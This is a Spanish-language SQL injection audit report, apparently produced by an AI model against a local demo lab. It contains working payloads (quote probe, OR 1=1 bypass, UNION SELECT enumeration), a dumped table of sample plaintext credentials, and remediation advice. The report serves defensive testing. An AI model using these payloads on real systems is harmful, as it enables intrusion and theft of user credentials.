# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:33:45  
**Modelo:** claude-sonnet-4.6  

---

## Resumen Ejecutivo

Se detectó y explotó con éxito una vulnerabilidad de **SQL Injection** de tipo **UNION-based** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permite acceso completo a la base de datos, incluyendo la extracción de credenciales de todos los usuarios registrados.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (UNION-based / Error-based) |
| **Severidad** | Crítica |
| **Parámetro vulnerable** | `id` (GET) |
| **URL** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Base de datos** | MariaDB |
| **Archivo vulnerable** | `/var/www/html/low.php` (línea 11) |

---

## Evidencia de la Vulnerabilidad

### 1. Detección - Error SQL con comilla simple

**Payload:** `?id=1'&Submit=Submit`

**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El servidor devuelve un error SQL que confirma que la entrada no es sanitizada y se inyecta directamente en la consulta.

### 2. Explotación - Bypass con OR

**Payload:** `?id=1' OR '1'='1&Submit=Submit`

**Resultado:** Se devuelven todos los registros de la tabla (8 usuarios), confirmando la inyección exitosa.

### 3. Explotación - UNION SELECT (extracción de datos)

**Payload para determinar columnas:** `?id=0' UNION SELECT 1,2-- -&Submit=Submit`
- Resultado: 2 columnas identificadas.

**Extracción de información del servidor:**

| Campo | Valor |
|-------|-------|
| Base de datos activa | `sqli_demo` |
| Usuario de BD | `root@172.18.0.3` |

**Tablas en la base de datos:**
- `users` (en schema `sqli_demo`)

**Columnas de la tabla `users`:**
- `user_id` (int)
- `first_name` (varchar)
- `last_name` (varchar)
- `username` (varchar)
- `password` (varchar)
- `email` (varchar)

---

## Datos Extraídos

### Credenciales completas de la tabla `users`

| ID | Username | Nombre Completo | Email | Password |
|----|----------|-----------------|-------|----------|
| 1 | admin | John Doe | admin@example.com | password123 |
| 2 | jsmith | Jane Smith | jane@example.com | secret456 |
| 3 | bjohnson | Bob Johnson | bob@example.com | mypass789 |
| 4 | awilliams | Alice Williams | alice@example.com | qwerty123 |
| 5 | cbrown | Charlie Brown | charlie@example.com | password |
| 6 | ddavis | Diana Davis | diana@example.com | secure123 |
| 7 | emiller | Eve Miller | eve@example.com | hackme |
| 8 | fwilson | Frank Wilson | frank@example.com | admin123 |

> ⚠️ **NOTA:** Las contraseñas se almacenan en **texto plano**, lo que constituye una vulnerabilidad adicional grave.

---

## Causa Raíz

El código en `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin ningún tipo de sanitización ni uso de consultas preparadas (prepared statements):

```php
// Consulta vulnerable (aproximación):
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

- **Confidencialidad:** Exposición total de todos los datos de usuarios, incluyendo credenciales en texto plano.
- **Integridad:** Posibilidad de modificar, insertar o eliminar datos en la base de datos.
- **Disponibilidad:** Posibilidad de eliminar tablas o corromper datos.
- **Escalada:** El usuario de BD es `root`, lo que podría permitir lectura/escritura de archivos del sistema (`LOAD_FILE`, `INTO OUTFILE`).

---

## Recomendaciones

1. **Usar Prepared Statements / Consultas Parametrizadas:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente un entero.

3. **Cifrar contraseñas:** Usar `password_hash()` con bcrypt en lugar de almacenar texto plano.

4. **Principio de mínimo privilegio:** La aplicación no debe ejecutarse con el usuario `root` de la base de datos.

5. **Deshabilitar mensajes de error detallados** en producción para no revelar información del sistema.

6. **Implementar WAF** (Web Application Firewall) como capa adicional de protección.

---

## Conclusión

La aplicación web presenta una vulnerabilidad crítica de SQL Injection que fue explotada con éxito para extraer la totalidad de los datos de la base de datos, incluyendo credenciales de 8 usuarios en texto plano. Se recomienda corrección inmediata mediante el uso de consultas preparadas y el cifrado de contraseñas.
